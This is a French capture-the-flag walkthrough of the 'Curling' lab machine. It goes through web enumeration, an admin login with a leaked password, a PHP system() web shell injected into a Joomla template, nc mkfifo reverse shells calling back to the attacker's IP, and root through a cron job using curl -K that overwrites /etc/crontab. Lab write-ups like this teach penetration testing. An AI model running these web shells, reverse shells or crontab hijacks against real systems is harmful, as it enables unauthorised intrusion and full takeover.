# Curling - Easy

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 14:33 EDT
Nmap scan report for 10.10.10.150
Host is up (0.034s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8ad169b490203ea7b65401eb68303aca (RSA)
|   256 9f0bc2b20bad8fa14e0bf63379effb43 (ECDSA)
|_  256 c12a3544300c5b566a3fa5cc6466d9a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.75 seconds
```

On va donc consulter de site web, on lance un gobuster en fond

```bash
/LICENSE.txt          (Status: 200) [Size: 18092]
/index.php            (Status: 200) [Size: 14264]
/.htaccess            (Status: 403) [Size: 277]  
/.                    (Status: 200) [Size: 14244]
/.html                (Status: 403) [Size: 277]  
/configuration.php    (Status: 200) [Size: 0]    
/.php                 (Status: 403) [Size: 277]  
/README.txt           (Status: 200) [Size: 4872] 
/.htpasswd            (Status: 403) [Size: 277]  
/htaccess.txt         (Status: 200) [Size: 3005] 
/.htm                 (Status: 403) [Size: 277]  
/.htpasswds           (Status: 403) [Size: 277]  
/.htgroup             (Status: 403) [Size: 277]  
/wp-forum.phps        (Status: 403) [Size: 277]  
/.htaccess.bak        (Status: 403) [Size: 277]  
/.htuser              (Status: 403) [Size: 277]  
/.ht                  (Status: 403) [Size: 277]  
/.htc                 (Status: 403) [Size: 277]  
/.htaccess.old        (Status: 403) [Size: 277]  
/.htacess             (Status: 403) [Size: 277]

/language             (Status: 301) [Size: 315] [--> http://10.10.10.150/language/]
/modules              (Status: 301) [Size: 314] [--> http://10.10.10.150/modules/] 
/images               (Status: 301) [Size: 313] [--> http://10.10.10.150/images/]  
/templates            (Status: 301) [Size: 316] [--> http://10.10.10.150/templates/]
/media                (Status: 301) [Size: 312] [--> http://10.10.10.150/media/]    
/cache                (Status: 301) [Size: 312] [--> http://10.10.10.150/cache/]    
/tmp                  (Status: 301) [Size: 310] [--> http://10.10.10.150/tmp/]      
/includes             (Status: 301) [Size: 315] [--> http://10.10.10.150/includes/] 
/plugins              (Status: 301) [Size: 314] [--> http://10.10.10.150/plugins/]  
/administrator        (Status: 301) [Size: 320] [--> http://10.10.10.150/administrator/]
/components           (Status: 301) [Size: 317] [--> http://10.10.10.150/components/]   
/bin                  (Status: 301) [Size: 310] [--> http://10.10.10.150/bin/]          
/libraries            (Status: 301) [Size: 316] [--> http://10.10.10.150/libraries/]                                                                                                                                                                          
/layouts              (Status: 301) [Size: 314] [--> http://10.10.10.150/layouts/]      
/server-status        (Status: 403) [Size: 277]                                          
/cli                  (Status: 301) [Size: 310] [--> http://10.10.10.150/cli/]
```

Le htaccess.txt nous donne plusieurs infos sur comment on pourrait exploiter le site. On cherche donc ce que l’on peut fiare dessus. Il est possible de se connecter mais pas de se register. On peut tenter un sqlmap sur le login.

```bash
[CRITICAL] all tested parameters do not appear to be injectable.
```

On essaye aussi sur le panel admin:

```bash
[CRITICAL] all tested parameters do not appear to be injectable.
```

On analyse donc le site plus en détail. On remarque ceci dans le code source:

```bash
<!-- secret.txt -->
```

On essaye donc de curl la page manuellement /secret.txt et l’on trouve un secret:

```bash
Q3VybGluZzIwMTgh
```

C’est le base64 pour Curling2018!, ce qui ressemble beaucoup à un mdp, on va essayer de se log sur le panel admin avec mais d’abord on trouve sur le site qu’il y a l’user “Super User” et un nom “Floris”, on peut se connecter en entrant Floris et le mdp trouvé. On est donc sur le panel admin et on va essayer d’obtenir une reverse shell. Dans templates on peut rajouter des fichiers au template et on rajoute donc une reverse shell  

[https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

Le fichier n’est pas trouvé alors on va essayer de rajouter un reverse shell php dans l’index.php

```bash
system($_REQUEST['test']);
```

Il suffit alors de tester pour voir que cela marche:

```bash
http://10.10.10.150/index.php?test=id
```

On lance donc une reverse shell et cela fonctionne avec celui-ci en utilisant burpsuite pour encode:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.6 9090 >/tmp/f
```

On trouve les credentials mysql de Floris dans la configuration du serveur:

```bash
public $user = 'floris';        
        public $password = 'mYsQ!P4ssw0rd$yea!';
```

```bash
mysql -u floris -p

show databases;

Database
information_schema
Joombla
```

On ne peut pas utiliser Database donc on cherche autre part. On trouve un hexdump d’un password:

```bash
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
```

On reverse donc le processus:

```bash
cat password_backup | xxd -r > /tmp/test
file test
test: bzip2 compressed data, block size = 900k
bzip2 -d test
file test.out
test.out: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix
mv test.out test.gz
gzip -d test.gz
file test.out
test: bzip2 compressed data, block size = 900k
bzip2 -d test
file test.out
test.out: POSIX tar archive (GNU)
tar xf test.out
```

On trouve donc finalement le fichier password.txt avec le mdp ssh de Floris: 5d<wdCbdZu)|hChXll

On upload linpeas:

```bash
╔══════════╣ .sh files in path                                                                                                 
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                     
/usr/bin/gettext.sh

root      1117  0.0  0.1  30036  3304 ?        Ss   12:55   0:00 /usr/sbin/cron -f
```

On remarque d’ailleurs des fichiers qui semblent auto-générés dans admin-area, surement par un cron. On va essayer d’analyser les cron avec ceci: https://github.com/DominicBreuker/pspy

On découvre alors ceci:

```bash
2023/04/03 13:34:01 CMD: UID=0     PID=26476  | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
2023/04/03 13:34:01 CMD: UID=0     PID=26475  | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
```

L’idée est de faire un crontab malicieux qui va nous permettre d’avoir une reverse shell. Le -K spécifie un fichier de config qui est input pour run le cron. On edit donc un crontab sur notre machine:

```bash
cp /etc/crontab .
echo '* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
2>&1|nc 10.10.16.6 9090 >/tmp/f ' >> crontab
python3 -m http.server
```

Sur la machine attaquée:

```bash
vi input
url = "http://10.10.16.6:8000/crontab"
output = /etc/crontab
```

Après un peu d’attente notre crontab est executé et on obtient un shell root